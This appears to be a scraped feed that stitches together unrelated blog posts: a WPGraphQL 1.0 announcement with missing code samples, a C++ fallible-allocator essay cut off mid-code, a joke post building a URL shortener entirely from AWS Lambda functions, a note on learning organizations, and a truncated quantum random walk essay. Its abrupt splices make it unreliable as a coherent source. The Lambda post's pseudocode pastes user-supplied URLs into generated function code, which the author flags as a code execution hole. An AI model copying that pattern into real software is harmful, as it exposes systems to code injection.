WPGraphQL on the WordPress.org plugin repository should make it easier for users to find and install and keep updated.</p><h2><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#new-wpgraphqlcom-website">New WPGraphQL.com website</a><span id="new-wpgraphqlcom-website"></span></h2><p>WPGraphQL.com has been re-built from the ground up. </p><p>Before today, WPGraphQL had 2 primary domains: </p><ul><li><code>WPGraphQL.com</code>, a “traditional” WordPress site using WordPress as the CMS <em>and </em>the theme layer</li><li><code>docs.wpgraphql.com</code>, a <a href="https://gatsbyjs.com/" data-type="URL" data-id="https://gatsbyjs.com">Gatsby</a> site using Markdown files in a Github repository for the content. </li></ul><p>Now, instead of splitting some content in Markdown files on Github and some content in WordPress, WPGraphQL.com now uses WordPress as the CMS for all content, and and has a Gatsby front-end powered by the new <a href="https://www.gatsbyjs.com/plugins/gatsby-source-wordpress-experimental/">Gatsby Source WordPress</a> plugin, <a href="https://wordpress.org/plugins/wp-gatsby/">WPGatsby</a> and of course <a href="https://wordpress.org/plugins/wp-gatsby/">WPGraphQL</a>. </p><p>We’ll be releasing tutorials and videos in the coming weeks and months walking through how various parts of the site were created to provide inspiration for you to build great things with this stack as well, but for now you can draw inspiration from the repository this site is built from: <a href="https://github.com/wp-graphql/wpgraphql.com">https://github.com/wp-graphql/wpgraphql.com</a></p><h2><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#wpgraphql-swag">WPGraphQL Swag</a><span id="wpgraphql-swag"></span></h2><p>Now, possibly the most exciting thing about this whole announcement, is the fact that you can now <a href="https://store.gatsbyjs.org/">get WPGraphQL Swag from the Gatsby swag store</a>.</p><h2><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#the-journey-to-10">The Journey to 1.0</a><span id="the-journey-to-10"></span></h2><p>WPGraphQL was started in November 2016 (with&nbsp;<a href="https://github.com/wp-graphql/wp-graphql/commit/6723f8cdf16b85cc827fe7ec1cbcb10aa02fa616">no commit message</a>&nbsp;🤣&nbsp;) and has come a long way in that time.</p><div><figure><img loading="lazy" src="https://www.wpgraphql.com/static/770921a32b9578c1779a53ddb653c9f4/Screen-Shot-2020-11-13-at-10.47.30-AM.png" alt="" sizes="(max-width: 333px) 100vw, 333px"><figcaption>Screenshot of the “Initial Commit” in Github</figcaption></figure></div><p>By the end of 2017 the codebase was pretty robust and provided a Schema to interact with many parts of WordPress. Posts, Pages, Custom Post Types, Tags, Categories, Custom Taxonomies, Comments and Nav Menus.</p><p><a href="https://qz.com/">Qz.com</a>&nbsp;was the first site to go to production with WPGraphQL, even before&nbsp;<em>I</em>&nbsp;was using it in production! A few years later and they are still running on WPGraphQL! You can learn more about the early days of their stack from&nbsp;<a href="https://www.youtube.com/watch?v=JvkDdYAA64A">this presentation</a>&nbsp;from December 2017.</p><p>In early 2018, my team took WPGraphQL into production on a network of 54 large WordPress sites. WPGraphQL was used as a syndication engine for our network of newspapers. Unlike most GraphQL users, we didn’t initially have a JavaScript or native mobile UI that was using GraphQL, we had PHP WordPress servers syndicating content and GraphQL solved a lot of pain points we had been facing when using REST.</p><p>By the end of 2018, more than 100 sites were using WPGraphQL in some way.</p><p>Now, WPGraphQL seems to be running all over the place!</p><p>This is a non-comprehensive list of sites using WPGraphQL in production in some way:</p><ul><li><a href="https://denverpost.com/">DenverPost.com</a></li><li><a href="https://twincities.com/">TwinCities.com</a></li><li><a href="https://mercurynews.com/">MercuryNews.com</a></li><li><a href="https://siliconvalley.com/">SiliconValley.com</a></li><li><a href="https://qz.com/">QZ.com</a></li><li><a href="https://meowwolf.com/">MeowWolf.com</a></li><li><a href="https://theplayerstribune.com/">ThePlayersTribune.com</a></li><li><a href="https://apollographql.com/blog">ApolloGraphQL.com</a></li><li><a href="https://blog.creditkarma.com/">blog.creditkarma.com</a></li></ul><p>According to&nbsp;<a href="https://packagist.org/packages/wp-graphql/wp-graphql">Packagist.org</a>&nbsp;as of June 30, 2020 there were nearly 50,000 installs of WPGraphQL in the wild, and as of November 2020 Packagist reports 71,573 installs.</p><p>In 2019 Credit Karma paid for a&nbsp;<a href="https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/">security audit</a>&nbsp;on the plugin and all reported issues were resolved.</p><p>It’s safe to say, WPGraphQL is production ready!</p><h2><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#so-why-the-wait-for-10">So, why the wait for 1.0?</a><span id="so-why-the-wait-for-10"></span></h2><p>So, if WPGraphQL has been production ready for such a long time, why is is still not 1.0?</p><h3><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#breaking-changes-wordpress">Breaking Changes &amp; WordPress</a><span id="breaking-changes-wordpress"></span></h3><p>The WordPress ecosystem has a strong commitment to backward compatibility. This means that once functionality is introduced to a WordPress plugin, it often sticks around&nbsp;<em>forever</em>.</p><p>With that in mind, before tagging WPGraphQL 1.0, I wanted so badly to be at a place with the codebase &amp; Schema that I could no longer predict anymore breaking changes. </p><p>I wanted the GraphQL Schema to be “perfect” before tagging it 1.0, because I knew that whatever would be in the WPGraphQL Schema at 1.0 would need to remain in the Schema&nbsp;<em>forever</em>. The WordPress community is used to things working the same way “forever” and I wanted to play along.</p><h3><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#breaking-changes-wpgraphql">Breaking Changes &amp; WPGraphQL</a><span id="breaking-changes-wpgraphql"></span></h3><p>The reality is that for software to get better, sometimes it needs to make breaking changes. </p><p>WPGraphQL will never be perfect, and it will&nbsp;<em>need</em>&nbsp;to occasionally break to make things better. </p><p>For example, when the GraphQL Specification updates to include Input Unions or Interfaces that can implement other Interfaces, WPGraphQL will need to break to keep up with the GraphQL Specification. </p><p>There would be no way to keep GraphQL as we know it today and take advantage of tomorrow’s GraphQL Spec without breaking.</p><p><strong>WPGraphQL turning 1.0 isn’t a statement that there will never be breaking changes, instead it’s a statement of stability and long term support.</strong></p><p>So, how will breaking changes be handled in a post-1.0 world?</p><h3><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#semantic-versioning">Semantic Versioning</a><span id="semantic-versioning"></span></h3><p>WPGraphQL has been following&nbsp;<a href="https://semver.org/">Semver</a>&nbsp;practices for a few years. We will continue to follow Semver and let version numbers communicate meaning. The summary of Semver versioning is as follows:</p><ul><li><strong>MAJOR</strong>&nbsp;version when you make incompatible API changes,</li><li><strong>MINOR</strong>&nbsp;version when you add functionality in a backwards compatible manner, and</li><li><strong>PATCH</strong>&nbsp;version when you make backwards compatible bug fixes.</li></ul><p>You can read more about the details of Semver at&nbsp;<a href="https://semver.org/">semver.org</a></p><h3><a href="https://www.wpgraphql.com/2020/11/16/announcing-wpgraphql-v1/#seamless-upgrade-paths">Seamless Upgrade Paths</a><span id="seamless-upgrade-paths"></span></h3><p>When WPGraphQL needs to make breaking changes to the Schema, there are sometimes ways to make the changes and allow for seamless upgrade paths.</p><p>What that means, is that WPGraphQL can introduce a new feature while keeping the old feature. For example, let’s say the following (hypothetical) query were in the Schema and the&nbsp;<code>author</code>&nbsp;field returned the name of the Author:</p><p>Let’s say we realized that the Author should actually be a one-to-one connection to an object with edge space for relational context. We would want to change the schema to allow for the following query instead.</p><p>If WPGraphQL made this change, any consumer application would break.</p><p>So, what we can do is introduce the new feature like so:</p><p>We could introduce the new feature as a new field name&nbsp;<code>authoredBy</code>&nbsp;which returns the data in the shape we want.</p><p>The end goal, however, is to have the&nbsp;<code>author</code>&nbsp;field return the&nbsp;<code>author.node.name</code>&nbsp;shape.</p><p>So, with both fields (author and authoredBy) co-existing on the server, consumer applications could make use of GraphQL Aliases and update their code from:</p><p>to:</p><p>Once consumers have updated their code, the server could then update once more to flip the old field name to the new shape. So, the next release would have the following possible:</p><p>So now, the old field&nbsp;<code>author</code>&nbsp;no longer returns the name directly, it now returns the new nested node/name shape. The client is using an alias to query the&nbsp;<code>authoredBy</code>&nbsp;field, so now the consumer should update their code from:</p><p>to:</p><p>Now, the consumer application is using the new shape of data and the old author field, and one more release would be able to remove the temporary&nbsp;<code>authoredBy</code>&nbsp;field that was used for seamless upgrades.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://soasis.org/posts/fallible-allocators/"><img src="https://soasis.org/img/2020/11/dog-catch-ball.jpg" alt="A sunset horizon and a person standing fairly close by, all reflected through a bubble up-close."></a></p><p>It turns out there are two kinds of allocators in the world, and out of the Systems Programming languages we deal with here, C++ has the most special one!</p><p>Unfortunately for us, it’s the one that actually leaves some performance and use cases out in the cold 🥶!</p><p>There are two allocation models that exist in various forms in C, C++, and Rust. All three languages support both allocation models, but how the language itself centers and defaults certain models is important to downstream development and interoperation between codebases. C and Rust have one allocation model, and it can be embodied by <a href="https://doc.rust-lang.org/std/alloc/trait.GlobalAlloc.html">the Rust documentation here for its <code>GlobalAlloc</code> trait</a>, with my own emphasis added:</p><blockquote><p><code>unsafe fn alloc(&amp;self, layout: Layout) -&gt; *mut u8</code></p><p>Allocate memory as described by the given <code>layout</code>.</p><p>Returns a pointer to newly-allocated memory, or <strong>null to indicate allocation failure</strong>.</p></blockquote><p>This embodies the important trait of the first and most fundamental allocation model…</p><h2 id="model-0-fallible-allocation">Model 0: Fallible Allocation</h2><p><em>Fallible Allocation</em> means that failure is built into how the desired allocator behaves. It is the <code>if result != null</code> style of handling. That is, the error is returned as part of <strong>normal control flow</strong>, and is central to the code itself. The Fallible model is how both low-level Rust (<code>GlobalAlloc</code> and <a href="https://doc.rust-lang.org/std/alloc/trait.AllocRef.html">its unstable/nightly friend, <code>AllocRef</code></a>) and C code (with <code>malloc</code> or its many, many replacements and variants) behave. C has no standard way to handle errors, so it is on the end-user to detect that allocation has failed and do something. Rust provides a bit more infrastructure for its Fallible model, thankfully. Folks working with unsafe code are encouraged to attempt allocation, and call the <a href="https://doc.rust-lang.org/std/alloc/fn.handle_alloc_error.html">default bad allocation handler</a> built into the standard for failure. Rust’s also comes with the ability to set a hook for allocation failure to further customize the behavior.</p><p>In both C and Rust, handling these errors is a part of using the allocator, and in both cases it is caught by checking for <code>null</code>/<code>NULL</code>. The null pointer value then becomes the sentinel and anchor that downstream users of C and Rust Allocators can switch on. Or, at least, this was the case with the global allocator: Rust’s <code>AllocRef</code> returns a more robust <code>Result&lt;NonNull&lt;[u8]&gt;, AllocErr&gt;</code>. A more informative <code>AllocErr</code> is returned for Rust’s enhanced interface, and old code using Rust’s the global allocator wrapped around this simply transmutes a <code>null</code> value to a basic allocator error. For C++ folk, <code>AllocRef</code>’s return type is the equivalent of <code>std::expected&lt;std::span&lt;unsigned char&gt;, bad_alloc&gt;</code>. (<a href="https://wg21.link/p0323">Not that <code>std::expected</code> is real yet</a>; it’s in a holding pattern as we spin around other topics instead.) Strangely enough, however, C++ chose a different model than Rust settled on or its predecessor, C, did. C++’s <code>std::allocator</code> and all conforming allocator objects, as well as the default <code>new</code> expressions, went for the second model…</p><h2 id="model-1-infallible-allocation">Model 1: Infallible Allocation</h2><p>In C++, every allocation in normal control flow is a perfect one. The reason for this perfection is because C++ developers, all coming from C, were frustrated by literal decades of writing this out in all sorts of ways:</p><div><pre><code data-lang="cpp"><span id="0">0</span><span>int</span><span>*</span> data_elements;
<span id="1">1</span><span>/* ...*/</span>
<span id="2">2</span>data_elements <span>=</span> malloc(<span>sizeof</span>(<span>int</span>) <span>*</span> data_elements_count);
<span id="3">3</span><span>if</span> (data_elements <span>==</span> <span>NULL</span>) {
<span id="4">4</span>	fprintf(stderr, <span>"well this is a big shame?"</span>);
<span id="5">5</span>	exit(<span>1</span>);
<span id="6">6</span>}
<span id="7">7</span><span>// actual real stuff to do
</span></code></pre></div><p>C++ decided that it wasn’t going to deal with this “error prone” code anymore, or let people just get away with calling <code>malloc</code> and not checking the return value properly at all (which, unfortunately, is done more often than I’d like to properly acknowledge in even the most robust software and firmware). So, when C++ created their <code>new</code>, they made it quite a bit more aggressive:</p><div><pre><code data-lang="cpp"><span id="0">0</span><span>int</span><span>*</span> data_elements;
<span id="1">1</span>data_elements <span>=</span> <span>new</span> <span>int</span>[data_elements_count]();
<span id="2">2</span><span>// actual real stuff to do
</span></code></pre></div><p>This code is shorter, more type-safe (the size is packed in the <code>new</code> expression and the multiplication is done implicitly for you in a lower-level language function), and no longer needs to check for the error. But that’s not because it can’t fail: it’s because the language has externalized the cost. It throws a <code>bad_alloc</code> exception now, rather than let the user handle it. This makes the call site clean and even provides a performance benefit to “happy path” code. So useful was this practice of turning errors (precondition violations, allocation failures, and more) into exceptions that when we created the <code>std::allocator</code> type to be paired with <code>std::vector</code> and everything it went into thereafter, we <a href="https://soasis.org/posts/fallible-allocators/eel.is/c++draft/allocator.requirements#general-10">baked this into the Cpp17Allocator named requirements</a>:</p><blockquote><p>Memory is allocated for an array of <code>n</code> <code>T</code> and such an object is created but array elements are not constructed.<br>…<br>[<em>Note 3: Additionally, the member function allocate for that type can fail by throwing an object of type <code>bad_­alloc</code>. — end note</em>]</p></blockquote><p><a id="fnref-allocator-pedanticism"></a>Nowhere are you allowed to return <code>NULL</code> or <code>nullptr</code> in C++ for its typical <code>Cpp17Allocator</code>. Once the <code>.allocate(n, ...)</code> function returns, <a href="#fn-allocator-pedanticism">it needs to be a valid pointer <sup>0</sup></a> to the first object for an array of at least <code>n</code> said objects. This makes the allocator Infallible and removes the need to check, which is definitely an improvement over its C predecessor. Ignoring the cost of polymorphic, inheritance-based exception throwing and catching, this seems like strictly a win. But even in a purely theoretical world with perfect, zero-cost exception handling, there is a design issue with <code>Cpp17Allocator</code>. There is no way to signal failure in the normal control flow of code. This creates an interesting problem, where you run into an interesting use case…</p><p>Or, AFINAE.</p><p>Allocation failure is not always an error in many cases. I do not mean this in the “well, we can free more memory and return a better pointer later” sense, I mean that literally the work can continue without using the allocated space asked for. This is most on display when it comes to certain algorithms: you can often trade increased space for better speed. The C++ standard recognizes this, too, and has wording built in to 3 algorithms for this. <a href="https://eel.is/c++draft/alg.merge#11">One such algorithm is <code>std::inplace_merge</code></a> (emphasis mine):</p><blockquote><p>Complexity: Let <em>N</em> = <code>last - first</code>:<br>— For the overloads with no <code>ExecutionPolicy</code>, and <strong>if enough additional memory is available</strong>, exactly <em>N</em> −1 comparisons.<br>— Otherwise, Θ(<em>N</em> log <em>N</em>) comparisons.</p></blockquote><p>But, if you look at the signature for <code>std::inplace_merge</code>:</p><div><pre><code data-lang="cpp"><span id="0">0</span><span>template</span><span>&lt;</span><span>class</span> <span>BidirectionalIterator</span><span>&gt;</span>
<span id="1">1</span><span>void</span> inplace_merge(BidirectionalIterator first,
<span id="2">2</span>                   BidirectionalIterator middle,
<span id="3">3</span>                   BidirectionalIterator last);
</code></pre></div><p>There’s no memory source.</p><p>What gives?</p><p>Well, it turns out that these algorithms just… take some memory. Usually, its taken from some unspecified global pool. Algorithms like this in the Standard Library are <code>std::inplace_merge</code>, <code>std::stable_sort</code>, and <code>std::stable_partition</code>. For example, in the Microsoft C++ Standard Library, they just <a href="https://github.com/microsoft/STL/blob/master/stl/inc/algorithm#L7929">call their own internal version of <code>std::get_temporary_buffer()</code> (now deprecated)</a>. <code>get_temporary_buffer</code> was implemented <a href="https://twitter.com/barrelshifter/status/659080214891204608">poorly in all STL implementations</a>, but the API’s design was exactly what was needed. It gave a chunk of memory suitable for an array of that object type, or signaled failure in normal control flow without throwing an exception. This is essential to fulfilling the promise of these algorithms, because they can work both with and without memory. From this design need, it can be immediately observed:</p><p><em><code>Allocators</code> in C++ are fundamentally incapable of solving this problem in the Standard Library!</em></p><p>There is no extra parameter to give a memory source to <code>inplace_merge</code> or <code>stable_sort</code> because in C++ there is no type that satisfies these requirements. Passing a <code>std::allocator</code> here will simply crash and burn, and it’s not like <code>std::memory_resource</code> is any better since it maintains the <a href="https://eel.is/c++draft/mem.res.private#2">same “returns a valid pointer, tosses an exception, or dies”</a> mentality. By centering an Infallible Allocator model in C++, we traded simplicity for the lack of ability to handle complex cases. This also doesn’t stop here, either: Parallel Algorithm and, soon, Executor-based implementations of asynchronous/parallel algorithms are going to need memory sources they can strongly control as well.</p><p>Not having any kind of Fallible Allocator in the Standard thus becomes a damaging problem that hampers our ability to control allocations. It means forcing developers to outlaw the use of those functions in shared code if they are targeting specific environments. It means not being able to just opt-in to always using the fall back option directly. And, ultimately, it means a standard library that is less useful and less inclusive of diverse, important use cases in the wild. Parallel algorithms are not going anywhere, and the need for them is only going to increase as heterogenous computing continues to thrive.</p><p>So, we are going to need to have a Fallible Allocator, at some point.</p><p>Ultimately, it seems like the best way to solve this problem is by creating a new <code>FallibleAllocator</code> named requirement that has the requisite API changes. Particularly, rather than <code>my_alloc.allocate(...)</code> returning a pointer, it will return a <code>std::optional&lt;non_null&lt;T*&gt;&gt;</code>. The reason I say this over something like <code>std::expected&lt;non_null&lt;T*&gt;, bad_alloc&gt;</code> like Rust is because <code>bad_alloc</code> is a lot more heavyweight than I would ever want it, and no user-facing constructor allows anyone to override what information is kept in the string. Thusly <code>optional</code> is strictly better here. A minimal class would likely take this form:</p><div><pre><code data-lang="cpp"><span id="0"> 0</span><span>#include</span> <span>&lt;optional&gt;</span><span>

<p>Some people, when confronted with a problem, think "I know, I'll use AWS Lambda." Now they have thousands of concurrent problems.</p>

<p>If you want to know how to build a sanely-architected url-shortener using AWS Lambda on top of a datastore like Postgres, this is not the post for you.  We're going to build a Rube-Goldberg url-shortener using <em>just</em> Lambda.</p>

<!--break-->


<p>And since it may not be clear to everyone, this post contains Bad Ideas™ and Extremely Inappropriate Uses of Tools®.  Don't try this in production.</p>

<p><img src="https://kevinkuchta.com/files/lambda_diagram.png" width="600" alt=""></p>



<p>As a brief background, AWS Lambda is a "Function as a Service" service.  You give amazon some code (a function) and they'll run it for you — once, 1000 times, 1000 times <em>at</em> once, whatever you need.  It's a way of running certain kinds of code in the cloud without needing to manage your own server, not even a virtual one.</p>

<p>Lambda is a very specific kind of hammer that's extremely good at hammering a very specific kind of nail.  This blog post will not be discussing that nail.  This blog post will not discuss anything close.  Because it turns out you can use a hammer to drive a wing-nut into silly putty if you swing hard enough and are willing to get messy.</p>



<p>Ok, so the first thing any url-shortener needs is link mapping.  Somewhere you need to store that <code>/123</code> maps to <code>html5zombo.com</code>.  Well, you've got an input and an output - that sounds like a Lambda function!  What if we just create a new Lambda function for every link mapping!  Millions of separate Lambda functions.  After a quick check to make sure there's no limit on the number of Lambda functions you can have (besides an upper limit of 75GB of storage space), we're off to the races.</p>

<p>As an example, the function <code>read_123</code> will just be hardcoded to return <code>html5zombo.com</code>:</p>

<pre><code>def handle(event, context):
    return { 'url': 'html5zombo.com' }
</code></pre>

<p>However, a url-shortener needs to produce links, not Lambda functions.  We want the url <code>/123</code> to trigger this function and return the url as a 301 redirect.  For that we turn to API Gateway.  It's a poweful, flexible tool with a million options, but we're just going to use it to hot-glue urls to lambda functions.  For our read function, we can configure a resource (<code>123</code>) and a method on that resource (<code>GET</code>) to trigger our Lambda function.</p>

<p>Unfortunately, Api Gateway wasn't built to support thousands and thousands of separate endpoints like <code>/123</code>, <code>/124</code>, <code>/125</code>, etc.  There's a limit of 300 resources per api.  You can request an increase on that limit, but I suspect "because I thought it would be funny" won't be a compelling justification.</p>

<p>We're not stuck, though—we can fix this problem the way we fix all problems: more Lambda functions!  We'll just define one new endpoint that takes a url parameter: <code>/{id}</code> in api gateway.  That'll execute a single Lambda function (call it <code>read(id)</code>) that will, in turn, execute the specific read function (eg <code>read_123</code>) we want.</p>

<p>In pseudocode, <code>read(123)</code> would look like:</p>

<pre><code>def handle(event, context):
    read_result = AWS.lambda.invoke('read_' + event.id)
    return {
        'statusCode': 301,
        'headers': { 'Location': read_result['url'] }
    }
</code></pre>

<p>Alright, so using two different types of read functions, <code>read(id)</code> and <code>read_123</code> (and <code>_124</code>, etc), we've got shortened links working.  Loading up <code>/123</code> in your browser tells ApiGateway to run <code>read(123)</code>, which runs <code>read_123</code>, which returns <code>html5zombo.com</code>.</p>



<p>Soon we'll want to put together a function to generate these short links.  There's another hurdle first, though.  We need a global counter!  When a user goes to shorten a new link, we need to know what the next id (eg <code>124</code>) is.  We need to store a global counter somewhere.</p>

<p>Now, saner developers might tell you that Lambda is stateless and you can't use it to store data.  You and I know those people just lack strength of character.  Remember: if Lambda functions don't solve your problem, you're not using enough of them.</p>

<p>As it turns out, all you need to do to store a global counter is write a self-updating Lambda function!  Let's call this function <code>iterator</code>, and in pseudocode it looks like:</p>

<pre><code>def handle(event, context):
  i = 0
  myCode = load the code for this function from the filesystem
  myCode = myCode.replace('i = ' + i, 'i = ' + (i+1))
  AWS.lambda.updateCode('iterator', myCode)
  return i
</code></pre>

<p>Self-updating code: what could go wrong?</p>

<p><img src="https://thumbor.forbes.com/thumbor/960x0/smart/https%3A%2F%2Fblogs-images.forbes.com%2Fmarkhughes%2Ffiles%2F2016%2F01%2FTerminator-2-1200x873.jpg" width="600" alt=""></p>

<p>Now, the observant among you might be noticing a problem (besides the obvious one that this is all horrifying):  concurrent requests to this function might overwrite each other.  A good fix for this would be to use literally anything else in technology as a datastore.  But since obviously that's not the fix we're going to use, we'll just tell Lambda to limit the maximum concurrency on this function to 1 so it can never run twice in a row!</p>

<p><img src="https://kevinkuchta.com/files/lambda_concurrency.png" width="600" alt=""></p>

<p>And now we've got our massively overcomplicated way of storing one number in the cloud!  Here I am using <code>apex</code>, a handy Lambda cli tool, to run the <code>iterator</code> function repeatedly.</p>

<pre><code>$ apex invoke iterator -a '$LATEST'
{"statusCode": 200, "body": "74"}
$ apex invoke iterator -a '$LATEST'
{"statusCode": 200, "body": "75"}
$ apex invoke iterator -a '$LATEST'
{"statusCode": 200, "body": "76"}
</code></pre>



<p>Alright, we now have everything we need to create a write function - the one that actually shortens links for us.  We want to be able to send an HTTP POST request with a body like <code>{ url: 'hamsterdance.com' }</code> and receive a shortened url like <code>kmk.party/123</code> in return.  In yet more pseudocode:</p>

<pre><code>def handle(event, context):
  # Grab the url we're given
  url = json.parse(event.body).url
  nextI = AWS.lambda.invoke('iterator')

  newFunctionBody = """
    def handle(event, context):
      return { url: ${url} }
  """
  newFunctionName = 'read_' + nextI
  AWS.lambda.createFunction(newFunctionName, newFunctionBody)
  return 'kmk.party/' + nextI
</code></pre>

<p>As you can see, every time you use this <code>write</code> function to create a new shortened link, we make an api call to generate an entirely new Lambda function with unique code.  This is totally reasonable and not at all a ridiculous misuse of an amazing tool.</p>

<p>As a brief aside, I should mention that this is a horrible security hole.  <code>url</code> is untrusted user input, but we're just interpolating it into code and <em>running</em> that code.  We can work around that, though, by <a href="https://github.com/kkuchta/url_shortener/blob/master/functions/write/main.py#L21">base-64 encoding and decoding the url</a>.</p>



<p><img src="https://kevinkuchta.com/files/lambda_diagram.png" width="600" alt=""></p>

<p>All the pieces of this abomination are in place.</p>

<p>Now the only thing left for a proper url-shortener is a frontend!  There are plenty of simple and nearly free places to host a flat file with a bit of JS to act as that frontend so obviously we're not going to use any of those.  Hosting a flat file is, though pointless and bizarre, quite easy on Lambda (pseudocode):</p>

<pre><code>def handle(event, context):
    return {
        'statusCode': 200,
        'body': file.read('./index.html'),
        'headers': { 'Content-Type': 'text/html' }
    }
</code></pre>

<p>Index.html just contains some JS to make an HTTP POST to our write function and display the resulting short link.</p>

<p>And there it is: a url-shortener using only Lambda.  We've abused AWS's api to make self-updating functions.  We've flooded our AWS account with single-purpose functions whose output is hardcoded.  We've used the wrongest possible tool to serve flat files, slowly.  We stopped <em>just</em> short of a publicly-available arbitrary code execution bug on my personal AWS account.  Let's call it a day!  Here it is live at <a href="https://kmk.party/">kmk.party</a> and here's the <a href="https://github.com/kkuchta/url_shortener">full, non-pseudocode</a>.</p>

<p>FAQ:</p>

<p>This is really neat <strong>Yes it is thank you</strong></p>

<p>This is absolutely horrifying <strong>See previous answer</strong></p>

<p>Should I use this in production? <strong>Only if you video tape it for posterity</strong></p>

<p>WHY? <strong>Because someone said I couldn't do it</strong></p>

<p>How would you actually go about building a url-shortener? <strong>The inspiration for this post was one called <a href="https://outcrawl.com/go-url-shortener-lambda/">Building a URL Shortener with Go and AWS Lambda</a>.  I got really excited in the moments between reading that title and realizing it was really building a shortener using Go and Lambda <em>and</em> DynamoDB.  When I get overexcited, things like this happen.</strong></p>

<p>Why python? <strong>I wrote half of this in node, but creating/updating Lambda functions requires creating a zip file which node doesn't do natively.  Using a node library requires a huge node_modules folder that must itself get zipped up when you're making a self-updating function like some kind of crazy person.  Switching to python, with its built-in Zipfile module, saved a lot of time and made the iterator run in under a second instead of around 5.</strong></p>

<p>I very much enjoy Code That Should Not Be <strong>Then you might like <a href="https://kevinkuchta.com/2017/07/disguising-ruby-as-javascript/">Disguising Ruby as Javascript</a> where I wield ruby metaprogramming like a hacksaw in a horror film.</strong></p>

<p>I know a way to make this whole thing even more ridiculous <strong>Tweet at me (<a href="https://twitter.com/kkuchta">@kkuchta</a>)! The world-fire can always use more fuel.</strong></p>

<p>Building software products means coping with complexity. Our products are highly interconnected systems of systems. Dynamics are difficult to model; outcomes can be difficult to predict. </p>



<p>Ivory towers crumble on this unstable ground. It is not sufficient to have one person deciding for the whole group – everyone following the direction of a “grand strategist”. Decision-making in complex environments needs to be decentralized.</p>



<p>If we are all to take part in decision-making, then we all need to constantly improve our knowledge of the problems we face – we need to be active participants in a learning organization.</p>



<p>Learning is both an individual and a group experience. Organizations that excel tap the commitment to learn from people at all levels. And learning is something deeper than just taking in information. It is about changing ourselves – growing in meaningful ways that contribute to the collective whole. So we want to build an organizational culture that promotes that deep connection to growth. </p>



<p>I have found the five disciplines of learning&nbsp;from the book The Fifth Discipline helps to inspire ideas about how to develop this culture. A quick summary: </p>



<div><figure><img src="https://images-na.ssl-images-amazon.com/images/I/71RhAPMibaL.jpg" alt="The Fifth Discipline: The art and practice of the learning organization:  Senge, Peter M.: 8601420120846: Books - Amazon.ca" width="118" height="178"></figure></div>



<ol><li>Systems thinking – seeing how all of our work connects, sharing the big picture. Proactively developing a collective understanding that we can use at all levels to spot patterns such as how certain problems persist, or the way systems develop built-in limitations to growth. (Systems can be technical, organizational, managerial, etc.)</li><li>Personal Mastery – continually developing our ability to see our current reality more clearly; this flows from the idea that what we do is creative work, and creativity results from the movement of ideas. “Still water becomes stagnant.”</li><li>Mental Models – models guide our ability to make decisions and are rooted in an organization’s fundamental values and principles. How are we building them? Sharing them? Reinforcing them? They have a natural entropy and tendency to diverge – they must be actively maintained, especially the core values at their foundation.</li><li>Shared Vision – having a shared vision enables co-creation. When we have that vision present in our day to day work, we are building things together for a common goal. This helps frame the context of the learning we engage in. </li><li>Team Learning – this involves two practices: discourse and discussion. Discourse is the practice of presenting knowledge to others. Discussion is the practice of inquiry and exploration into the discourse. Both are crucial.&nbsp;</li></ol>



<p>To build a learning org, we can start by asking the questions in these disciplines to enrich our learning experience. Questions like: How can I help other teams expand their understanding of how our work connects? How can I share my mental model with others? What activities can I do to reinforce our shared values? What kinds of “discourse” activities can I be doing to promote discussions? </p>



<p>We can start doing that today by creating the Tiny Habits needed to ask these questions at the right times. And we should not expect anyone to build out learning organization for us – we all need to take ownership and do our part. What are you doing to help?</p>

                    <p><a href="https://en.wikipedia.org/wiki/Quantum_mechanics">Quantum mechanics</a> is probably the most unintuitive scientific theory in the history of humankind—nothing behaves like we are used to. In this essay, we will try to get back some intuition of how to think about quantum mechanics, more specifically the quantum random walk. No worries, there are going to be <em>no equations</em>—this is not a scientific paper. The main purpose of this essay is to make the reader curious by showing how weird our reality is and how this knowledge might help us in the future.</p><p>Most people are familiar with the classical random walk which is a mathematical framework used to describe a lot of phenomena—e.g. Stock-prices and Brownian motion. The quantum random walk is less known and not as useful for explanations, but there are some interesting fields it might get more important in. The most notable cases are quantum computing—specifically Grover’s Algorithm—and quantum biology. The later field is the study of how and why quantum mechanics is important for explaining biology and it is still a pretty new and often controversial field.</p><h2 id="classical">Classical</h2><p>The <a href="https://en.wikipedia.org/wiki/Random_walk">classical random walk</a> in one dimension can be thought of as flipping a coin and going one step forward (+1) if it shows heads and one step backward (-1) if it shows tails. This is the simplest version of the random walk but it is sufficient to illustrate some important concepts.</p><p>The first thing to note is that probabilities approach a <a href="https://en.wikipedia.org/wiki/Normal_distribution">normal distribution</a> (Gaussian). After one coin flip—T=1 steps—we find ourselves with the probability of 1/2 at 1 and with the probability of 1/2 at -1. After T=2 steps we find ourselves with a probability of 1/4 at 2, with the probability of 1/4 at -2, and with the probability of 1/2 at 0 (Figure 3). By continuing this sequence, we can see the normal distribution emerging.</p><figure><img src="https://images.squarespace-cdn.com/content/v1/5dd3db4b74619b13c315e268/1586508603527-Q4JJL2080G6VZWKF1M1Q/ke17ZwdGBToddI8pDm48kIjS6q4cv5cYFkTz_escvjFZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVHk1kd5ZhDKaoPBq5dMMgNiLIFqjsmkQkqMmAV2uYMQkty480UlKOY0DP3Mqxn-Omk/image-asset.jpeg?format=500w" alt="The random walk can be visualized with Galton’s Board."></figure><figure><img src="https://images.squarespace-cdn.com/content/v1/5dd3db4b74619b13c315e268/1586509218902-IQ5G4Z3K1RGD1VFKIV0J/ke17ZwdGBToddI8pDm48kC4WqmtwEkHAKs-GAMAt7IJZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIMY-uRSxFfrlmpPcZO_V5RxeWyHosL0CxVv30qiNAUhM/Screen+Shot+2020-04-10+at+11.00.08.png?format=500w" alt="Probability distribution of a classical random walk"></figure><p>One important but counter-intuitive fact is that after T steps the average distance from our starting point (0) is not 0. You might expect that if we always move +1 or 